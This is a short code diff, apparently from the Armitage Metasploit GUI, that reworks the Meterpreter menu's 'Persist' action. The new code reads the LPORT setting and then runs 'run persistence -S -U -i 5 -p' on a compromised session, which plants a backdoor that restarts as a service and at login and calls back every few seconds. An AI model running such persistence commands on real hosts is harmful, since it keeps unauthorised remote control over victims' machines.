@@ -171,12 +171,19 @@ sub showMeterpreterMenu {
 		}, $sid => "$sid"));
 
 		item($j, "Persist", 'P', lambda({
-			oneTimeShow("run");
-			local('$port');
-			$port = randomPort();
-			elog("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
-			warn("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
-			m_cmd($sid, "run persistence -S -U -i 5 -A -p $port");
+			thread(lambda({
+				cmd_safe("setg LPORT", lambda({
+					local('$p');
+					$p = [$3 trim];
+					if ($p ismatch 'LPORT => (\d+)') {
+						oneTimeShow("run");
+						local('$port');
+						$port = matched()[0];
+						elog("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
+						m_cmd($sid, "run persistence -S -U -i 5 -p $port");
+					}
+				}, \$sid));
+			}, \$sid));
 		}, $sid => "$sid"));
 	}
 			
